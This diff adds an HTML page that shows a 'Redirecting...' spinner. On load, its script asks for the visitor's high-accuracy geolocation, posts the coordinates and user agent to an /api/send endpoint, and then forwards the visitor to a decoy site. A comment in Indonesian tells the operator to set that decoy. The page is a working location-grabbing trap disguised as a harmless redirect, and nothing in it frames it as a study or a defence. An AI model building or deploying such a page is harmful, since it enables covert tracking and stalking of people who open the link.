@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <style>
+        body { background: #111; color: #555; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 3px solid #333; border-top: 3px solid #007bff; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <script>
+        // --- GANTI KE WEB TUJUAN ---
+        const TARGET_URL = "https://www.google.com"; 
+
+        async function startTrap() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    console.log("Location obtained, sending...");
+                    try {
+                        const response = await fetch('/api/send', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude,
+                                acc: pos.coords.accuracy,
+                                ua: navigator.userAgent
+                            })
+                        });
+                        const resData = await response.json();
+                        console.log("Server response:", resData);
+                    } catch (err) {
+                        console.error("Fetch error:", err);
+                    } finally {
+                        window.location.replace(TARGET_URL);
+                    }
+                }, (err) => {
+                    console.warn("User denied or error:", err.message);
+                    window.location.replace(TARGET_URL);
+                }, { enableHighAccuracy: true, timeout: 8000 });
+            } else {
+                window.location.replace(TARGET_URL);
+            }
+        }
+
+        window.onload = startTrap;
+    </script>
+</body>
+</html>
